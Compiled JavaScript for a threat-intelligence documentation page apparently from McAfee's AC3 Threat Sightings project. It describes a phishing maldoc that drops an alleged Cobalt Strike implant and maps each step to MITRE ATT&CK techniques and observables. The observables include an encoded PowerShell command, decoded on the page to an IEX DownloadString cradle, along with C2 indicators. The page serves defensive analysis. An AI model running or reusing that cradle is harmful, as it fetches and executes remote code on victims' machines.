"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[8076],{3248:function(e,t,a){var n=a(7294),l=a(7273);l.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){l.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},2352:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return k},default:function(){return c}});var n=a(7462),l=a(3366),r=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,m={unversionedId:"Sightings/UNK-Phishing",id:"Sightings/UNK-Phishing",isDocsHomePage:!1,title:"UNK-Phishing",description:"Overview",source:"@site/docs/03-Sightings/11-UNK-Phishing.md",sourceDirName:"03-Sightings",slug:"/Sightings/UNK-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/UNK-Phishing",tags:[],version:"current",sidebarPosition:11,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"TA551-Phishing",permalink:"/ac3-threat-sightings/docs/Sightings/TA551-Phishing"},next:{title:"HermeticWiper",permalink:"/ac3-threat-sightings/docs/Sightings/HermeticWiper"}},k=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"Threat actor used <em>Email</em> to deliver weaponized <em>doc</em> file for Initial Access.",id:"threat-actor-used-email-to-deliver-weaponized-doc-file-for-initial-access",children:[]},{value:"Threat actor used <em>weaponized doc file</em> with appealing file name to lure users for Execution.",id:"threat-actor-used-weaponized-doc-file-with-appealing-file-name-to-lure-users-for-execution",children:[]},{value:"Threat actor used <em>weaponized doc file</em> to drop a <em>PE file</em> -likely a Cobalt Strike beacon- for Command And Control.",id:"threat-actor-used-weaponized-doc-file-to-drop-a-pe-file--likely-a-cobalt-strike-beacon--for-command-and-control",children:[]},{value:"Threat actor used <em>an scheduled task</em> to launch <em>alleged Cobalt Strike implant</em> every 15 minutes for Persistence.",id:"threat-actor-used-an-scheduled-task-to-launch-alleged-cobalt-strike-implant-every-15-minutes-for-persistence",children:[]},{value:"Threat actor used <em>alleged Cobalt Strike implant</em> for stablishing HTTP network connections for Command And Control.",id:"threat-actor-used-alleged-cobalt-strike-implant-for-stablishing-http-network-connections-for-command-and-control",children:[]},{value:"Threat actor used <em>alleged Cobalt Strike implant</em>  to launch <em>PowerShell</em> encoded commands for Defense Evasion.",id:"threat-actor-used-alleged-cobalt-strike-implant--to-launch-powershell-encoded-commands-for-defense-evasion",children:[]},{value:"Threat actor used <em>alleged Cobalt Strike implant</em>  to run <em>ipconfig</em> for Discovery.",id:"threat-actor-used-alleged-cobalt-strike-implant--to-run-ipconfig-for-discovery",children:[]},{value:"Threat actor used <em>alleged Cobalt Strike implant</em>  to inject into system processes for Defense Evasion.",id:"threat-actor-used-alleged-cobalt-strike-implant--to-inject-into-system-processes-for-defense-evasion",children:[]}]}],p={toc:k};function c(e){var t=e.components,a=(0,l.Z)(e,o);return(0,r.kt)("wrapper",(0,n.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h2",{id:"overview"},"Overview"),(0,r.kt)("p",null,"This Threat Sighting documents observed TTPs for Unknown Threat that starts with a phishing email with maldoc, followed by alleged Cobalt Strike activity. This Threat Sighting is based on direct observation."),(0,r.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Phishing.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_UNK-Phishing.yml")),(0,r.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,r.kt)("p",null,"Acknowledgements: @lekz86"),(0,r.kt)("h3",{id:"references"},"References:"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"..")),(0,r.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"Email")," to deliver weaponized ",(0,r.kt)("em",{parentName:"li"},"doc")," file for Initial Access."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"weaponized doc file")," with appealing file name to lure users for Execution."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"weaponized doc file")," to drop a ",(0,r.kt)("em",{parentName:"li"},"PE file")," -likely a Cobalt Strike beacon- for Command And Control."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"an scheduled task")," to launch ",(0,r.kt)("em",{parentName:"li"},"alleged Cobalt Strike implant")," every 15 minutes for Persistence."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"alleged Cobalt Strike implant")," for stablishing HTTP network connections for Command And Control."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"alleged Cobalt Strike implant"),"  to launch ",(0,r.kt)("em",{parentName:"li"},"PowerShell")," encoded commands for Defense Evasion."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"alleged Cobalt Strike implant"),"  to run ",(0,r.kt)("em",{parentName:"li"},"ipconfig")," for Discovery."),(0,r.kt)("li",{parentName:"ul"},"Threat actor used ",(0,r.kt)("em",{parentName:"li"},"alleged Cobalt Strike implant"),"  to inject into system processes for Defense Evasion.")),(0,r.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,r.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,r.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Execution"),(0,r.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,r.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,r.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,r.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,r.kt)("td",{parentName:"tr",align:null},"++ (2)")))),(0,r.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,r.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,r.kt)(i.Z,{chart:"\ngraph LR\nIA[Initial Access] --\x3e | _Email_ to deliver weaponized _doc_ file| IA[Initial Access]\nIA[Initial Access] --\x3e | _weaponized doc file_ with appealing file name to lure users| EXE[Execution]\nEXE[Execution] --\x3e | _weaponized doc file_ to drop a _PE file_ -likely a Cobalt Strike beacon-| C2[Command And Control]\nEXE[Execution] --\x3e | _an scheduled task_ to launch _alleged Cobalt Strike implant_ every 15 minutes| PER[Persistence]\nEXE[Execution] --\x3e | _alleged Cobalt Strike implant_ for stablishing HTTP network connections| C2[Command And Control]\nEXE[Execution] --\x3e | _alleged Cobalt Strike implant_  to launch _PowerShell_ encoded commands| DE[Defense Evasion]\nEXE[Execution] --\x3e | _alleged Cobalt Strike implant_  to run _ipconfig_| D[Discovery]\nEXE[Execution] --\x3e | _alleged Cobalt Strike implant_  to inject into system processes| DE[Defense Evasion]\n",mdxType:"Mermaid"}),(0,r.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,r.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,r.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,r.kt)("td",{parentName:"tr",align:null},"T1566.001 - Phishing: Malicious file"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"Email")," to deliver weaponized ",(0,r.kt)("em",{parentName:"td"},"doc")," file for Initial Access.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Execution"),(0,r.kt)("td",{parentName:"tr",align:null},"T1102 - User Execution"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"weaponized doc file")," with appealing file name to lure users for Execution.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,r.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"weaponized doc file")," to drop a ",(0,r.kt)("em",{parentName:"td"},"PE file")," -likely a Cobalt Strike beacon- for Command And Control.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,r.kt)("td",{parentName:"tr",align:null},"T1053.005 - Scheduled Task/Job: Scheduled Task"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"an scheduled task")," to launch ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant")," every 15 minutes for Persistence.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,r.kt)("td",{parentName:"tr",align:null},"T1071.001 - Application Layer Protocol: Web Protocols"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant")," for stablishing HTTP network connections for Command And Control.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,r.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to launch ",(0,r.kt)("em",{parentName:"td"},"PowerShell")," encoded commands for Defense Evasion.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,r.kt)("td",{parentName:"tr",align:null},"T1018 - Remote System Discovery",(0,r.kt)("br",null),"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to run ",(0,r.kt)("em",{parentName:"td"},"ipconfig")," for Discovery.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,r.kt)("td",{parentName:"tr",align:null},"T1055 - Process Injection"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to inject into system processes for Defense Evasion.")))),(0,r.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,r.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,r.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"),(0,r.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,r.kt)("td",{parentName:"tr",align:null},"T1566.001"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"Email")," to deliver weaponized ",(0,r.kt)("em",{parentName:"td"},"doc")," file for Initial Access."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"File Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\BF9XB0OA\\\\Incident Acknowledgement Form.doc")),(0,r.kt)("td",{parentName:"tr",align:null},"- ",(0,r.kt)("em",{parentName:"td"},"C:","\\","Users","\\","#{user}","\\","AppData","\\","Local","\\","Microsoft","\\","Windows","\\","INetCache","\\","Content.Outlook","\\")," is Outlooks temp folder.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Execution"),(0,r.kt)("td",{parentName:"tr",align:null},"T1102"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"weaponized doc file")," with appealing file name to lure users for Execution."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\\" /n \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\BF9XB0OA\\\\Incident Acknowledgement Form.doc\\" /o \\"\\"')),(0,r.kt)("td",{parentName:"tr",align:null})),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,r.kt)("td",{parentName:"tr",align:null},"T1105"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"weaponized doc file")," to drop a ",(0,r.kt)("em",{parentName:"td"},"PE file")," -likely a Cobalt Strike beacon- for Command And Control."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"File Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\mslibupdate.exe")),(0,r.kt)("td",{parentName:"tr",align:null},"- The PE file has no reputation in VT at the time of this investigation.",(0,r.kt)("br",null),"- Without having had access to file, we think this is cobalt strike beacon PE file.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,r.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"an scheduled task")," to launch ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant")," every 15 minutes for Persistence."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\mslibupdate.exe")),(0,r.kt)("td",{parentName:"tr",align:null},"- At this point, no evidence related to the creation of the scheduled task.",(0,r.kt)("br",null),"- One of the ENS scanners assigned lowest reputation (malicious).",(0,r.kt)("br",null),"- Adaptive Threat Protection ran the ",(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," application in a container.",(0,r.kt)("br",null),"- Real Protect-PENGSD5!551001703417 endpoint detection",(0,r.kt)("br",null),"- #{user} ran C:","\\","Users","\\","#{user}","\\","AppData","\\","Roaming","\\","mslibupdate.exe, which accessed HKLM","\\","SYSTEM","\\","CONTROLSET001","\\","SERVICES","\\","BAM\\STATE","\\","USERSETTINGS","\\","S-1-5-21-3721850961-3849296161-1077157389-252077","\\",', violating the rule \\"Modifying the Services registry location\\". Access was allowed because the rule was not configured to block.')),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,r.kt)("td",{parentName:"tr",align:null},"T1071.001"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant")," for stablishing HTTP network connections for Command And Control."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"13.214.87[.]25"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"outruncancer[.]org"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"10.2.8[.]31"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,r.kt)("inlineCode",{parentName:"td"},"outruncancer[.]org")),(0,r.kt)("td",{parentName:"tr",align:null},"- IP corresponds to Autonomous System Number 16509 (AMAZON-02), Singapure.",(0,r.kt)("br",null),"- GET /pb/web/40.12.1.337/simpleloader.js HTTP/1.1")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,r.kt)("td",{parentName:"tr",align:null},"T1059.001"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to launch ",(0,r.kt)("em",{parentName:"td"},"PowerShell")," encoded commands for Defense Evasion."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"powershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAH QAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAU wB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwA C4AMAAuADEAOgA1ADUANgA5ADMALwAnACkAOwAgAEkAbgB2AG8AawBlAC0ARABBAEMAa ABlAGMAawAgAC0ASQBuAGkAdABpAGEAbAAgAFQAcgB1AGUA"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\conhost.exe")),(0,r.kt)("td",{parentName:"tr",align:null},"- The encoded command decodes to: IEX (New-Object Net.Webclient).DownloadString('",(0,r.kt)("a",{parentName:"td",href:"http://127.0.0.1:55693/')"},"http://127.0.0.1:55693/')"),"; Invoke-DACheck -Initial True",(0,r.kt)("br",null),"- PowerShell commandline follows patterns observed on Cobalt Strike infections.",(0,r.kt)("br",null),"- ",(0,r.kt)("em",{parentName:"td"},"mslibupdate.exe")," is likely a Cobalt Strike implant.")),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,r.kt)("td",{parentName:"tr",align:null},"T1018",(0,r.kt)("br",null),"T1059.003"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to run ",(0,r.kt)("em",{parentName:"td"},"ipconfig")," for Discovery."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"ipconfig  /all"),(0,r.kt)("br",null),(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\cmd.exe /C ipconfig /all")),(0,r.kt)("td",{parentName:"tr",align:null})),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,r.kt)("td",{parentName:"tr",align:null},"T1055"),(0,r.kt)("td",{parentName:"tr",align:null},"Threat actor used ",(0,r.kt)("em",{parentName:"td"},"alleged Cobalt Strike implant"),"  to inject into system processes for Defense Evasion."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\dllhost.exe")),(0,r.kt)("td",{parentName:"tr",align:null})))),(0,r.kt)("h2",{id:"ttp-profiles-with-observables"},"TTP Profiles with Observables"),(0,r.kt)("h3",{id:"threat-actor-used-email-to-deliver-weaponized-doc-file-for-initial-access"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"Email")," to deliver weaponized ",(0,r.kt)("em",{parentName:"h3"},"doc")," file for Initial Access."),(0,r.kt)("h4",{id:"tactic"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Initial Access")),(0,r.kt)("h4",{id:"techniques"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1566.001 - Phishing: Malicious file")),(0,r.kt)("h4",{id:"behaviors-and-observables"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1566.001"),(0,r.kt)("td",{parentName:"tr",align:null},"Weaponized ",(0,r.kt)("em",{parentName:"td"},"doc")," file created at ",(0,r.kt)("em",{parentName:"td"},"Outlook")," temp folder by ",(0,r.kt)("em",{parentName:"td"},"Outlook"),"."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"File Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\BF9XB0OA\\\\Incident Acknowledgement Form.doc"))))),(0,r.kt)("h4",{id:"notes"},"Notes"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},(0,r.kt)("em",{parentName:"li"},"C:","\\","Users","\\","#{user}","\\","AppData","\\","Local","\\","Microsoft","\\","Windows","\\","INetCache","\\","Content.Outlook","\\")," is Outlooks temp folder.")),(0,r.kt)("h3",{id:"threat-actor-used-weaponized-doc-file-with-appealing-file-name-to-lure-users-for-execution"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"weaponized doc file")," with appealing file name to lure users for Execution."),(0,r.kt)("h4",{id:"tactic-1"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Execution")),(0,r.kt)("h4",{id:"techniques-1"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1102 - User Execution")),(0,r.kt)("h4",{id:"behaviors-and-observables-1"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1102"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Outlook")," spawned ",(0,r.kt)("em",{parentName:"td"},"Winword")," to open ",(0,r.kt)("em",{parentName:"td"},".doc")," file from ",(0,r.kt)("em",{parentName:"td"},"Outlook")," temp folder."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},'\\"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\\" /n \\"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\Content.Outlook\\\\BF9XB0OA\\\\Incident Acknowledgement Form.doc\\" /o \\"\\"'))))),(0,r.kt)("h3",{id:"threat-actor-used-weaponized-doc-file-to-drop-a-pe-file--likely-a-cobalt-strike-beacon--for-command-and-control"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"weaponized doc file")," to drop a ",(0,r.kt)("em",{parentName:"h3"},"PE file")," -likely a Cobalt Strike beacon- for Command And Control."),(0,r.kt)("h4",{id:"tactic-2"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Command And Control")),(0,r.kt)("h4",{id:"techniques-2"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1105 - Ingress Tool Transfer")),(0,r.kt)("h4",{id:"behaviors-and-observables-2"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1105"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Winword")," dropped PE file."),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"File Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Roaming\\\\mslibupdate.exe"))))),(0,r.kt)("h4",{id:"notes-1"},"Notes"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"The PE file has no reputation in VT at the time of this investigation."),(0,r.kt)("li",{parentName:"ul"},"Without having had access to file, we think this is cobalt strike beacon PE file.")),(0,r.kt)("h3",{id:"threat-actor-used-an-scheduled-task-to-launch-alleged-cobalt-strike-implant-every-15-minutes-for-persistence"},"Threat actor used ",(0,r.kt)("em",{parentName:"h3"},"an scheduled task")," to launch ",(0,r.kt)("em",{parentName:"h3"},"alleged Cobalt Strike implant")," every 15 minutes for Persistence."),(0,r.kt)("h4",{id:"tactic-3"},"Tactic"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Persistence")),(0,r.kt)("h4",{id:"techniques-3"},"Techniques"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"T1053.005 - Scheduled Task/Job: Scheduled Task")),(0,r.kt)("h4",{id:"behaviors-and-observables-3"},"Behaviors and Observables"),(0,r.kt)("table",null,(0,r.kt)("thead",{parentName:"table"},(0,r.kt)("tr",{parentName:"thead"},(0,r.kt)("th",{parentName:"tr",align:null},"Tech IDs"),(0,r.kt)("th",{parentName:"tr",align:null},"Behaviors"),(0,r.kt)("th",{parentName:"tr",align:null},"Observables"))),(0,r.kt)("tbody",{parentName:"table"},(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,r.kt)("td",{parentName:"tr",align:null},"SVCHOST execution for Scheduled Task"),(0,r.kt)("td",{parentName:"tr",align:null},(0,r.kt)("em",{parentName:"td"},"Process Created"),": ",(0,r.kt)("br",null),"- ",(0,r.kt)("inlineCode",{parentName:"td"},"C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k netsvcs -p -s Schedule"))),(0,r.kt)("tr",{parentName:"tbody"},(0,r.kt)("td",{parentName:"tr",align:null},"T1053.005"),(0,r.kt)("td",{parentName:"tr",align:null},"Periodic execution of ",(0,r.kt)("em",{parentName:"td"},"PE file")," (every 15 